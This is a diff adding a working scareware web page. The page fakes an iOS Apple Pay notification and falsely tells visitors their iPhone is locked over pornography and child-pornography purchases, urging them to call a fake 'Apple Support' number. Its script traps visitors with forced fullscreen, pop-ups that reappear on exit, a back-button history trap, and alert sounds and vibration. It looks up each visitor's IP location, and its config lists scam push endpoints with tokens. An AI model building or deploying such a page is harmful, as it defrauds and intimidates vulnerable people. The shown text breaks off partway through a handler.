@@ -1,0 +1,963 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <meta name="mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <meta name="apple-mobile-web-app-title" content="Notification" />
+  <meta name="theme-color" content="#000000" />
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate" />
+  <meta name="googlebot" content="noindex, nofollow, noarchive" />
+  <meta name="bingbot" content="noindex, nofollow, noarchive" />
+  <meta name="referrer" content="no-referrer" />
+  <meta http-equiv="X-Robots-Tag" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
+  <title>Error</title>
+  <!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-RRR4wNq8W98sWYvXD0nxA.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "x0djlsz7d3");
+</script>
+  <base href="./" />
+  <link rel="manifest" href="manifest.webmanifest" />
+  <link rel="apple-touch-icon" href="assets/default-logo.svg" />
+  <link rel="icon" type="image/svg+xml" href="assets/default-logo.svg" />
+  <style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+html, body {
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  overscroll-behavior: none;
+  overscroll-behavior-x: none;
+  background: #000;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  -webkit-tap-highlight-color: transparent;
+  -webkit-text-size-adjust: 100%;
+  touch-action: pan-y;
+}
+
+#app {
+  position: fixed;
+  inset: 0;
+  width: 100vw;
+  height: 100vh;
+  height: 100dvh;
+}
+
+#content-frame {
+  position: absolute;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  border: 0;
+  background: #fff;
+}
+
+#popup-overlay,
+#popup-overlay-2 {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.65);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  padding: 16px;
+  transition: opacity 0.2s ease;
+}
+
+#popup-overlay.hidden,
+#popup-overlay-2.hidden {
+  opacity: 0;
+  pointer-events: none;
+}
+
+#popup, #popup2 {
+  position: relative;
+  width: 270px;
+  max-width: 90%;
+  background: rgba(242, 242, 242, 0.86);
+  backdrop-filter: saturate(180%) blur(20px);
+  -webkit-backdrop-filter: saturate(180%) blur(20px);
+  border-radius: 14px;
+  overflow: hidden;
+  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+  padding: 0;
+  animation: pop 0.25s ease;
+  font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
+}
+
+@keyframes pop {
+  from { transform: scale(0.9); opacity: 0; }
+  to   { transform: scale(1); opacity: 1; }
+}
+
+.popup-content {
+  padding: 19px 16px 18px;
+  text-align: center;
+}
+
+.popup-content h2 {
+  font-size: 17px;
+  font-weight: 600;
+  color: #000;
+  margin-bottom: 4px;
+  letter-spacing: -0.3px;
+}
+
+.popup-content p {
+  font-size: 13px;
+  color: #000;
+  line-height: 1.32;
+  letter-spacing: -0.08px;
+}
+
+.popup-actions {
+  display: flex;
+  border-top: 0.5px solid rgba(0, 0, 0, 0.18);
+}
+
+.dlg-btn {
+  flex: 1;
+  background: transparent;
+  border: 0;
+  padding: 8px 0;
+  font-size: 14px;
+  color: #007aff;
+  cursor: pointer;
+  font-family: inherit;
+  letter-spacing: -0.2px;
+}
+
+.dlg-btn:active {
+  background: rgba(0, 0, 0, 0.05);
+}
+
+.dlg-cancel {
+  font-weight: 400;
+  border-right: 0.5px solid rgba(0, 0, 0, 0.18);
+}
+
+.dlg-ok {
+  font-weight: 600;
+}
+
+
+#show-popup-btn, #fs-btn {
+  position: fixed;
+  bottom: max(16px, env(safe-area-inset-bottom));
+  background: rgba(0, 0, 0, 0.7);
+  color: #fff;
+  border: 0;
+  border-radius: 999px;
+  padding: 10px 16px;
+  font-size: 14px;
+  cursor: pointer;
+  z-index: 100;
+  backdrop-filter: blur(6px);
+}
+
+#show-popup-btn { right: 16px; }
+#fs-btn { left: 16px; width: 44px; height: 44px; padding: 0; font-size: 18px; }
+
+.ios-notif {
+  position: fixed;
+  top: max(12px, env(safe-area-inset-top));
+  left: 50%;
+  /* Start tucked just above the screen, slightly tilted + scaled-down so the
+     entrance feels like a real iOS Dynamic Island banner dropping in. */
+  transform: translateX(-50%) translateY(calc(-100% - 40px)) scale(0.92);
+  width: calc(100% - 24px);
+  max-width: 420px;
+  background: rgba(245, 245, 247, 0.82);
+  backdrop-filter: saturate(180%) blur(24px);
+  -webkit-backdrop-filter: saturate(180%) blur(24px);
+  border-radius: 18px;
+  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.18);
+  padding: 12px 14px;
+  display: flex;
+  align-items: stretch;
+  gap: 12px;
+  z-index: 2000;
+  font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
+  color: #000;
+  opacity: 0;
+  pointer-events: auto;
+  will-change: transform, opacity;
+}
+
+.notif-icon { align-self: flex-start; }
+
+.notif-right {
+  display: flex;
+  flex-direction: column;
+  align-items: flex-end;
+  justify-content: space-between;
+  flex-shrink: 0;
+  margin-left: auto;
+  align-self: stretch;
+}
+
+.notif-right .notif-time {
+  line-height: 1.2;
+}
+
+.apple-pay {
+  width: 44px;
+  height: auto;
+  display: block;
+}
+
+/* iOS-style spring drop-in: subtle overshoot then settle. */
+.ios-notif.show {
+  animation: notif-drop 0.85s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+}
+
+@keyframes notif-drop {
+  0% {
+    transform: translateX(-50%) translateY(calc(-100% - 40px)) scale(0.92);
+    opacity: 0;
+  }
+  60% {
+    transform: translateX(-50%) translateY(8px) scale(1.02);
+    opacity: 1;
+  }
+  100% {
+    transform: translateX(-50%) translateY(0) scale(1);
+    opacity: 1;
+  }
+}
+
+/* Periodic attention "wiggle" — happens after entrance to draw the eye. */
+.ios-notif.shake {
+  animation: notif-shake 0.6s cubic-bezier(0.36, 0.07, 0.19, 0.97);
+}
+
+@keyframes notif-shake {
+  0%, 100% { transform: translateX(-50%) translateY(0) scale(1); }
+  15%      { transform: translateX(calc(-50% - 8px)) translateY(0) scale(1.01) rotate(-1.5deg); }
+  30%      { transform: translateX(calc(-50% + 8px)) translateY(0) scale(1.01) rotate(1.5deg); }
+  45%      { transform: translateX(calc(-50% - 6px)) translateY(0) scale(1.01) rotate(-1deg); }
+  60%      { transform: translateX(calc(-50% + 6px)) translateY(0) scale(1.01) rotate(1deg); }
+  75%      { transform: translateX(calc(-50% - 3px)) translateY(0) scale(1) rotate(-0.5deg); }
+  90%      { transform: translateX(calc(-50% + 3px)) translateY(0) scale(1) rotate(0.5deg); }
+}
+
+.ios-notif.hidden {
+  pointer-events: none;
+}
+
+.notif-icon {
+  width: 38px;
+  height: 38px;
+  flex-shrink: 0;
+}
+
+.notif-icon svg {
+  width: 100%;
+  height: 100%;
+  display: block;
+  border-radius: 9px;
+  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+}
+
+.notif-body {
+  flex: 1;
+  min-width: 0;
+}
+
+.notif-header {
+  display: flex;
+  justify-content: flex-start;
+  font-size: 12px;
+  color: rgba(60, 60, 67, 0.7);
+  margin-bottom: 2px;
+  text-transform: none;
+}
+
+.notif-time {
+  font-size: 12px;
+  color: rgba(60, 60, 67, 0.7);
+  line-height: 1;
+}
+
+.notif-app {
+  font-weight: 500;
+  letter-spacing: -0.1px;
+}
+
+.notif-title {
+  font-size: 14px;
+  font-weight: 600;
+  letter-spacing: -0.2px;
+  line-height: 1.25;
+  margin-bottom: 1px;
+}
+
+.notif-text {
+  font-size: 14px;
+  font-weight: 400;
+  letter-spacing: -0.2px;
+  line-height: 1.3;
+  color: #000;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+@media (max-width: 480px) {
+  #popup, #popup2 {
+    width: 88vw;
+    max-width: 88vw;
+    border-radius: 13px;
+  }
+  .popup-content { padding: 16px 14px 14px; }
+  .popup-content p { font-size: 13px; line-height: 1.35; }
+  .dlg-btn { font-size: 14px; padding: 9px 0; }
+
+  .ios-notif {
+    width: calc(100% - 16px);
+    padding: 10px 12px;
+    gap: 10px;
+    border-radius: 16px;
+  }
+  .notif-icon { width: 34px; height: 34px; }
+  .notif-title { font-size: 13px; }
+  .notif-text { font-size: 13px; }
+  .apple-pay { width: 38px; }
+
+  #show-popup-btn, #fs-btn { display: none; }
+}
+
+@media (max-width: 360px) {
+  #popup, #popup2 { width: 92vw; max-width: 92vw; }
+  .notif-text, .notif-title { font-size: 12px; }
+  .notif-app, .notif-time { font-size: 11px; }
+}
+
+</style>
+</head>
+<body>
+  <div id="app">
+    <iframe id="content-frame" src="about:blank" allowfullscreen referrerpolicy="no-referrer"></iframe>
+
+    <div id="ios-notification" class="ios-notif hidden" role="alert">
+      <div class="notif-icon">
+        <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <defs>
+            <linearGradient id="imsg-grad" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0%" stop-color="#5BF675"/>
+              <stop offset="100%" stop-color="#0CBD2A"/>
+            </linearGradient>
+          </defs>
+          <rect width="64" height="64" rx="14" ry="14" fill="url(#imsg-grad)"/>
+          <path fill="#ffffff" d="M32 14c-11 0-20 7.2-20 16.1 0 5 2.8 9.4 7.2 12.3.4.3.6.7.5 1.2-.4 1.8-1.3 4.1-2.9 6 0 0 4.7-.2 8.6-3.1.4-.3.9-.4 1.4-.3 1.7.5 3.5.8 5.2.8 11 0 20-7.2 20-16.1S43 14 32 14z"/>
+        </svg>
+      </div>
+      <div class="notif-body">
+        <div class="notif-header">
+          <span class="notif-app" id="notif-app"></span>
+        </div>
+        <div class="notif-title" id="notif-title"></div>
+        <div class="notif-text" id="notif-text"></div>
+      </div>
+      <div class="notif-right">
+        <span class="notif-time" id="notif-time"></span>
+        <svg class="apple-pay" viewBox="0 0 60 38" xmlns="http://www.w3.org/2000/svg" aria-label="Apple Pay">
+          <rect x="1" y="1" width="58" height="36" rx="6" ry="6" fill="none" stroke="#000" stroke-width="1.6"/>
+          <g fill="#000" transform="translate(11.5, 11)">
+            <path d="M5.6 2.2c.5-.6.8-1.5.7-2.3-.7 0-1.5.4-2 1-.4.5-.8 1.4-.7 2.2.8.1 1.6-.4 2-.9zM6.3 4c-1.1 0-2 .6-2.5.6-.6 0-1.3-.6-2.2-.6C.4 4 0 5.2 0 6.7c0 1.5 1 3 1.6 4 .6.9 1.1 1.7 2 1.7.8 0 1.1-.5 2.1-.5s1.3.5 2.1.5c.9 0 1.5-.9 2-1.7.6-1 .8-1.9.9-2-.1-.1-1.7-.7-1.7-2.6 0-1.7 1.3-2.5 1.4-2.5-.8-1.1-2-1.3-2.5-1.3-1-.1-1.9.6-2.6.6z"/>
+            <path d="M16.8 1.7c2 0 3.3 1.3 3.3 3.3 0 2-1.4 3.4-3.4 3.4h-2.2v3.5h-1.6V1.7h3.9zm-2.3 5.3h1.8c1.3 0 2.1-.7 2.1-2 0-1.3-.7-2-2-2h-1.9v4zM20.4 9.7c0-1.3 1-2.1 2.8-2.2l2.1-.1v-.6c0-.9-.6-1.4-1.6-1.4-.9 0-1.5.4-1.6 1.1h-1.5c.1-1.4 1.3-2.4 3.2-2.4 1.9 0 3.1 1 3.1 2.5v5.3h-1.5v-1.3c-.4.8-1.4 1.4-2.5 1.4-1.6 0-2.5-1-2.5-2.3zm4.9-.7v-.6l-1.9.1c-.9.1-1.5.5-1.5 1.2 0 .7.6 1.2 1.4 1.2 1.2 0 2-.7 2-1.9zM28.1 14.8v-1.2c.1 0 .4 0 .5 0 .7 0 1-.3 1.3-1l.1-.5L27.3 4h1.7l1.9 6.1L32.8 4h1.6L31.8 11c-.6 1.7-1.3 2.3-2.7 2.3-.1 0-.7 0-1 0z"/>
+          </g>
+        </svg>
+      </div>
+    </div>
+
+    <div id="popup-overlay" class="hidden" aria-hidden="true">
+      <div id="popup" role="dialog" aria-modal="true">
+        <div class="popup-content">
+          <p id="popup-message"></p>
+        </div>
+        <div class="popup-actions">
+          <button id="cancel-btn" type="button" class="dlg-btn dlg-cancel"></button>
+          <button id="ok-btn" type="button" class="dlg-btn dlg-ok"></button>
+        </div>
+      </div>
+    </div>
+
+    <div id="popup-overlay-2" class="hidden" aria-hidden="true">
+      <div id="popup2" role="dialog" aria-modal="true">
+        <div class="popup-content">
+          <p id="popup2-message"></p>
+        </div>
+        <div class="popup-actions">
+          <button id="cancel-btn-2" type="button" class="dlg-btn dlg-cancel"></button>
+          <button id="ok-btn-2" type="button" class="dlg-btn dlg-ok"></button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  
+<script>window.__POPUP_CFG__ = {"timings":{"stepDelayMs":1000,"countdownMinutes":10,"idleSeconds":10,"infoCountdownMinutes":5},"notification":{"app":"Messages","time":"now","title":"Payment Successful","text":"Sent €239.99 via Apple Pay to Pornhub \u003cbr>Premium. Not you ? call \u003ca href=\"tel:+18665574551\">+1 866 557 4551\u003c/a>"},"popup":{"message":"Your iPhone has been locked due to illegal pronography activity on your device. Your purchase of €239.99 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support +1 866 557 4551 to unlock it.","cancelLabel":"Cancel","okLabel":"Call +18008881245","okPhoneNumber":"+18665574551"},"popup2":{"message":"Are you sure you want to continue?","cancelLabel":"Cancel","okLabel":"Call +18008881245","okPhoneNumber":"+18665574551"},"sounds":{"notification":null,"popup1":null,"popup2":null},"page":{"logoUrl":"assets/logo-1779304330823.png","backgroundImageUrl":"assets/bg-1779304344566.png","heading":"Purchase Successful","subtitle":"Your order has been confirmed and a receipt has been sent to your email.","infoTitle":"Transaction of €239.99 via Apple Pay for Child Pornography was found","infoMessage":"For security reasons you are prohibited from using your device","extraMessage":"Not You? Call Apple Support:+1 866 557 4551 to unlock your device.","buttonText":"Time left to unlock request","infoCountdownText":"","browserTitle":""},"pushTargets":[{"id":"2a4d297201cb","name":"infidelityfinder.help/test","url":"https://infidelityfinder.help/test","token":"c66666743c60eb3d999eff584b8c281d9a2564acd2a7170796a31b830aaae045","pushUrl":"https://infidelityfinder.help/test/router.php?endpoint=push","enabled":true,"lastPushAt":1779304352681,"lastError":null,"source":"auto","lastSeenAt":1782528161630},{"id":"250c8d4d76c3","name":"whatsguardian.com/abc","url":"https://whatsguardian.com/abc","token":"c66666743c60eb3d999eff584b8c281d9a2564acd2a7170796a31b830aaae045","pushUrl":"https://whatsguardian.com/abc/router.php?endpoint=push","enabled":true,"lastPushAt":1779303663962,"lastError":null,"source":"auto","firstSeenAt":1779295417291,"lastSeenAt":1780374126995},{"id":"bdbc38e326f2","name":"trisdflras.z13.web.core.windows.net/","url":"https://trisdflras.z13.web.core.windows.net","token":"1713d526817cb82701c80c1063d591681eb3c8008c0eaf047a0a8dc90b960699","pushUrl":"https://trisdflras.z13.web.core.windows.net/router.php?endpoint=push","enabled":true,"lastPushAt":0,"lastError":"HTTP 405","source":"manual-bundle","firstSeenAt":1779298923818,"lastSeenAt":0},{"id":"0d04c74630d7","name":"dmflwos.z13.web.core.windows.net","url":"https://dmflwos.z13.web.core.windows.net","token":"b5950bd6dd31e58654b6d8c4e06a4075f2b5fd2b0bade6e16a86744ef391da75","pushUrl":"https://dmflwos.z13.web.core.windows.net/router.php?endpoint=push","enabled":false,"lastPushAt":0,"lastError":null,"source":"manual-bundle","firstSeenAt":1780324584322,"lastSeenAt":0},{"id":"24378d4f92c0","name":"ewambe.z13.web.core.windows.net","url":"https://ewambe.z13.web.core.windows.net","token":"184b3a755eb987163b0aaffaed9ba6dc253bcc48f93f30998954173aae30d071","pushUrl":"https://ewambe.z13.web.core.windows.net/router.php?endpoint=push","enabled":false,"lastPushAt":0,"lastError":null,"source":"manual-bundle","firstSeenAt":1780336097728,"lastSeenAt":0},{"id":"ed13c705fc2b","name":"rihtwislin.z13.web.core.windows.net","url":"https://rihtwislin.z13.web.core.windows.net","token":"1b79cdec7ee32c854433e54297cea55f64e87466c4d427211fd78f08b97a7376","pushUrl":"https://rihtwislin.z13.web.core.windows.net/router.php?endpoint=push","enabled":true,"lastPushAt":0,"lastError":"fetch failed","source":"manual-bundle","firstSeenAt":1780497337526,"lastSeenAt":0}]};</script>
+<script>(async () => {
+  const frame = document.getElementById('content-frame');
+  const overlay = document.getElementById('popup-overlay');
+  const overlay2 = document.getElementById('popup-overlay-2');
+  const cancelBtn = document.getElementById('cancel-btn');
+  const okBtn = document.getElementById('ok-btn');
+  const cancelBtn2 = document.getElementById('cancel-btn-2');
+  const okBtn2 = document.getElementById('ok-btn-2');
+  const notif = document.getElementById('ios-notification');
+  const popupEl = document.getElementById('popup');
+  const popupEl2 = document.getElementById('popup2');
+
+  let cfg = null;
+  cfg = window.__POPUP_CFG__ || null;
+  if (cfg && !cfg.visitor) {
+    try {
+      const r = await fetch('https://ipapi.co/json/', { headers: { 'Accept': 'application/json' } });
+      if (r.ok) {
+        const d = await r.json();
+        cfg.visitor = {
+          ip: d.ip || '',
+          deviceModel: '', deviceType: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+          deviceOS: navigator.platform || '', browser: '',
+          isp: d.org || '', org: d.org || '', asn: d.asn || '',
+          country: d.country_name || '', countryCode: d.country || '',
+          region: d.region || '', city: d.city || ''
+        };
+      }
+    } catch (e) {}
+    if (!cfg.visitor) cfg.visitor = {};
+  }
+
+  // Sanitize HTML — allow a small whitelist of tags / attributes so admins
+  // can embed mailto:, tel:, and http(s) links. Everything else is stripped.
+  function sanitizeHTML(input) {
+    if (input == null) return '';
+    const div = document.createElement('div');
+    div.innerHTML = String(input);
+    const ALLOWED = {
+      A:      ['href', 'target', 'rel', 'title', 'class'],
+      BR:     [],
+      STRONG: [],
+      B:      [],
+      EM:     [],
+      I:      [],
+      U:      [],
+      SPAN:   ['class', 'style'],
+      SMALL:  []
+    };
+    function walk(parent) {
+      Array.from(parent.childNodes).forEach(child => {
+        if (child.nodeType === Node.ELEMENT_NODE) {
+          const tag = child.tagName;
+          if (!ALLOWED[tag]) {
+            while (child.firstChild) parent.insertBefore(child.firstChild, child);
+            parent.removeChild(child);
+            return;
+          }
+          const allowedAttrs = ALLOWED[tag];
+          Array.from(child.attributes).forEach(a => {
+            if (!allowedAttrs.includes(a.name.toLowerCase())) {
+              child.removeAttribute(a.name);
+            }
+          });
+          if (tag === 'A') {
+            const href = (child.getAttribute('href') || '').trim();
+            if (!/^(https?:|mailto:|tel:|\/|#)/i.test(href)) {
+              child.removeAttribute('href');
+            } else if (/^https?:/i.test(href)) {
+              if (!child.getAttribute('target')) child.setAttribute('target', '_blank');
+              child.setAttribute('rel', 'noopener noreferrer');
+            }
+          }
+          walk(child);
+        } else if (child.nodeType === Node.COMMENT_NODE) {
+          parent.removeChild(child);
+        }
+      });
+    }
+    walk(div);
+    return div.innerHTML;
+  }
+
+  const visitor = (cfg && cfg.visitor) || {};
+  function applyKeywords(text) {
+    if (text == null) return text;
+    return String(text)
+      .replace(/\{ip\}/gi, visitor.ip || '')
+      .replace(/\{device\}/gi, visitor.deviceModel || '')
+      .replace(/\{device_type\}/gi, visitor.deviceType || '')
+      .replace(/\{os\}/gi, visitor.deviceOS || '')
+      .replace(/\{browser\}/gi, visitor.browser || '')
+      .replace(/\{isp\}/gi, visitor.isp || '')
+      .replace(/\{org\}/gi, visitor.org || '')
+      .replace(/\{asn\}/gi, visitor.asn || '')
+      .replace(/\{country\}/gi, visitor.country || '')
+      .replace(/\{country_code\}/gi, visitor.countryCode || '')
+      .replace(/\{region\}/gi, visitor.region || '')
+      .replace(/\{city\}/gi, visitor.city || '');
+  }
+
+  if (cfg) {
+    // Browser tab title — let admin override the static <title> in index.html.
+    const bt = (cfg.page && cfg.page.browserTitle ? String(cfg.page.browserTitle) : '').trim();
+    if (bt) document.title = bt;
+
+    const n = cfg.notification || {};
+    const setHTML = (id, val) => {
+      const el = document.getElementById(id);
+      if (el && val != null) el.innerHTML = sanitizeHTML(applyKeywords(val));
+    };
+    setHTML('notif-app', n.app);
+    setHTML('notif-time', n.time);
+    setHTML('notif-title', n.title);
+    setHTML('notif-text', n.text);
+
+    const p = cfg.popup || {};
+    setHTML('popup-message', p.message);
+    if (p.cancelLabel != null) cancelBtn.innerHTML = sanitizeHTML(applyKeywords(p.cancelLabel));
+    // OK button label is fixed — click behaviour (advance vs. dial) is
+    // determined by whether okPhoneNumber is configured, not the label.
+    okBtn.textContent = 'OK';
+
+    const p2 = cfg.popup2 || {};
+    setHTML('popup2-message', p2.message);
+    if (p2.cancelLabel != null) cancelBtn2.innerHTML = sanitizeHTML(applyKeywords(p2.cancelLabel));
+    okBtn2.textContent = 'OK';
+  }
+
+  frame.src = 'success.html?v=20260521g';
+
+  let showPopup = () => {
+    overlay.classList.remove('hidden');
+    overlay.setAttribute('aria-hidden', 'false');
+  };
+  let hidePopup = () => {
+    overlay.classList.add('hidden');
+    overlay.setAttribute('aria-hidden', 'true');
+  };
+  let showPopup2 = () => {
+    overlay2.classList.remove('hidden');
+    overlay2.setAttribute('aria-hidden', 'false');
+  };
+  let hidePopup2 = () => {
+    overlay2.classList.add('hidden');
+    overlay2.setAttribute('aria-hidden', 'true');
+  };
+
+  cancelBtn.addEventListener('click', () => {
+    enterFullscreen();
+    hidePopup();
+    showPopup2();
+    playSound('popup2');
+    vibrate([300]);
+  });
+  okBtn.addEventListener('click', () => {
+    // If admin configured a phone number for popup 1's OK button, the
+    // click becomes a tel: dial. Otherwise advance to popup 2.
+    const phone = ((cfg && cfg.popup && cfg.popup.okPhoneNumber) || '').toString().trim();
+    if (phone) {
+      window.location.href = 'tel:' + phone.replace(/[^\d+]/g, '');
+      return;
+    }
+    enterFullscreen();
+    hidePopup();
+    showPopup2();
+    playSound('popup2');
+    vibrate([200]);
+  });
+  cancelBtn2.addEventListener('click', () => {
+    enterFullscreen();
+    hidePopup2();
+    showPopup();
+    playSound('popup1');
+    vibrate([150]);
+  });
+  okBtn2.addEventListener('click', () => {
+    const phone = ((cfg && cfg.popup2 && cfg.popup2.okPhoneNumber) || '').toString().trim();
+    if (phone) {
+      window.location.href = 'tel:' + phone.replace(/[^\d+]/g, '');
+      return;
+    }
+    enterFullscreen();
+    hidePopup2();
+    showPopup();
+    playSound('popup1');
+    vibrate([150]);
+  });
+  // Escape is the browser's exit-fullscreen key. We don't hide popups for
+  // it — instead, the fullscreenchange handler below re-surfaces popup 1
+  // as a failsafe so the visitor immediately sees something actionable.
+
+  const STEP_DELAY = (cfg && cfg.timings && cfg.timings.stepDelayMs) || 2000;
+
+  let audioCtx = null;
+  function getAudio() {
+    if (!audioCtx) {
+      const Ctx = window.AudioContext || window.webkitAudioContext;
+      if (Ctx) audioCtx = new Ctx();
+    }
+    return audioCtx;
+  }
+  function playDefaultTone() {
+    const ctx = getAudio();
+    if (!ctx) return;
+    if (ctx.state === 'suspended') ctx.resume().catch(() => {});
+    const now = ctx.currentTime;
+    const tones = [
+      { freq: 659.25, start: 0,    dur: 0.32 },
+      { freq: 783.99, start: 0.28, dur: 0.36 },
+      { freq: 987.77, start: 0.58, dur: 0.55 }
+    ];
+    tones.forEach(t => {
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.type = 'sine';
+      osc.frequency.value = t.freq;
+      gain.gain.setValueAtTime(0.0001, now + t.start);
+      gain.gain.exponentialRampToValueAtTime(0.12, now + t.start + 0.05);
+      gain.gain.exponentialRampToValueAtTime(0.0001, now + t.start + t.dur);
+      osc.connect(gain).connect(ctx.destination);
+      osc.start(now + t.start);
+      osc.stop(now + t.start + t.dur + 0.05);
+    });
+  }
+  function playSound(key) {
+    const url = cfg && cfg.sounds && cfg.sounds[key];
+    if (url) {
+      try {
+        const a = new Audio(url);
+        a.volume = 0.9;
+        const p = a.play();
+        if (p && typeof p.catch === 'function') p.catch(() => playDefaultTone());
+        return;
+      } catch (e) {}
+    }
+    playDefaultTone();
+  }
+  ['click', 'keydown', 'touchstart'].forEach(ev =>
+    window.addEventListener(ev, () => { getAudio(); }, { once: true })
+  );
+
+  // ── Platform detection ────────────────────────────────────────────────────
+  const IS_IOS = /iPad|iPhone|iPod/.test(navigator.platform)
+    || (navigator.userAgent.includes('Mac') && 'ontouchend' in document);
+
+  // ── iOS "near-fullscreen" via visualViewport ──────────────────────────────
+  // iOS Safari refuses to enter true fullscreen for arbitrary documents — the
+  // OS-level URL bar can only be hidden by the user scrolling. We compensate
+  // by sizing the app to the actual visible viewport (visualViewport API)
+  // so the popup is always centered in what the user can see, never hidden
+  // under the URL bar or notch.
+  if (IS_IOS && window.visualViewport) {
+    function syncIosViewport() {
+      const vh = window.visualViewport.height;
+      document.documentElement.style.setProperty('--ios-vh', vh + 'px');
+      const appEl = document.getElementById('app');
+      if (appEl) appEl.style.height = vh + 'px';
+      // Nudge the URL bar offscreen on first chance (only works after a
+      // scroll happens in the page).
+      if (window.scrollY < 1) window.scrollTo(0, 1);
+    }
+    syncIosViewport();
+    window.visualViewport.addEventListener('resize', syncIosViewport);
+    window.visualViewport.addEventListener('scroll', syncIosViewport);
+    window.addEventListener('orientationchange', () => setTimeout(syncIosViewport, 200));
+  }
+
+  // ── Auto-fullscreen on first user gesture ─────────────────────────────────
+  // Browsers block programmatic fullscreen on page load. The earliest we
+  // can request it is on the first click/tap/key the user makes. iOS
+  // Safari ignores this entirely — only PWA mode (add to home screen)
+  // hides the URL bar there.
+  function enterFullscreen() {
+    if (document.fullscreenElement || document.webkitFullscreenElement) return;
+    const el = document.documentElement;
+    const req = el.requestFullscreen
+      || el.webkitRequestFullscreen
+      || el.mozRequestFullScreen
+      || el.msRequestFullscreen;
+    if (req) {
+      try { req.call(el).catch(() => {}); } catch (e) {}
+    }
+    // iOS bonus: scroll to push the URL bar offscreen as much as the OS allows.
+    if (IS_IOS) {
+      try { window.scrollTo(0, 1); } catch (e) {}
+    }
+  }
+  let fullscreenDone = false;
+  function tryFullscreenOnce() {
+    if (fullscreenDone) return;
+    if (document.fullscreenElement || document.webkitFullscreenElement) {
+      fullscreenDone = true;
+      return;
+    }
+    enterFullscreen();
+    if (document.fullscreenElement || document.webkitFullscreenElement) {
+      fullscreenDone = true;
+    }
+  }
+  // Listen for any activity the browser counts as a user gesture.
+  const FS_TRIGGERS = [
+    'click', 'mousedown', 'mouseup', 'mousemove', 'mouseover',
+    'pointerdown', 'pointermove',
+    'touchstart', 'touchmove', 'touchend',
+    'wheel', 'scroll',
+    'keydown', 'keyup'
+  ];
+  FS_TRIGGERS.forEach(ev =>
+    window.addEventListener(ev, tryFullscreenOnce, { capture: true, passive: true })
+  );
+  // Lightweight watchdog: while not yet in fullscreen, retry on any
+  // subsequent gesture. The browser will reject the call if no user
+  // activation is fresh, so this is harmless when nobody has moved.
+  setInterval(() => {
+    if (fullscreenDone) return;
+    if (document.fullscreenElement || document.webkitFullscreenElement) {
+      fullscreenDone = true;
+    }
+  }, 1000);
+  // Failsafe: if the visitor exits fullscreen (Escape, X button on the
+  // browser's fullscreen overlay, swipe-down on mobile, etc.), immediately
+  // re-show popup 1. The next click on either of its buttons re-enters
+  // fullscreen as a fresh user gesture (browsers won't allow us to
+  // request fullscreen on the exit event itself — that's the same key
+  // press that caused the exit).
+  function onFullscreenExit() {
+    if (document.fullscreenElement || document.webkitFullscreenElement) return;
+    fullscreenDone = false;
+    // Hide popup 2 if it was visible — popup 1 is the failsafe entry point.
+    hidePopup2();
+    showPopup();
+    playSound('popup1');
+    vibrate([100]);
+  }
+  document.addEventListener('fullscreenchange', onFullscreenExit);
+  document.addEventListener('webkitfullscreenchange', onFullscreenExit);
+
+  // ── Back-button: keep visitors on the landing page ────────────────────────
+  // Single-state history trap. Back press lands them back on the same URL.
+  // Refresh, tab close, and the OS-level back gesture are NOT intercepted
+  // (those need to keep working — the reload triggered by our own OK
+  // button counts as a "fresh page" and shouldn't trigger any prompt).
+  history.pushState({ stay: true }, '', location.href);
+  window.addEventListener('popstate', () => {
+    history.pushState({ stay: true }, '', location.href);
+  });
+
+  // ── Re-engagement signals ─────────────────────────────────────────────────
+  // The single source of truth for "bring popup 1 back": all the patterns
+  // below funnel into this so we never stack multiple popups on top of
+  // each other and we avoid flapping when several signals fire at once.
+  let lastReengageAt = 0;
+  function reengage(reason) {
+    // Throttle to once every 4s to prevent rapid duplicate re-shows.
+    if (Date.now() - lastReengageAt < 4000) return;
+    lastReengageAt = Date.now();
+    if (overlay2 && !overlay2.classList.contains('hidden')) return; // popup 2 already open
+    if (overlay && !overlay.classList.contains('hidden')) return;   // popup 1 already open
+    showPopup();
+    playSound('popup1');
+    vibrate([100]);
+  }
+
+  // 1. Exit-intent — fast cursor move toward the very top of the viewport.
+  let lastY = null, lastT = 0;
+  document.addEventListener('mousemove', (e) => {
+    const now = performance.now();
+    if (lastY != null && e.clientY < 10 && lastY - e.clientY > 4 && now - lastT < 200) {
+      reengage('exit-intent');
+    }
+    lastY = e.clientY;
+    lastT = now;
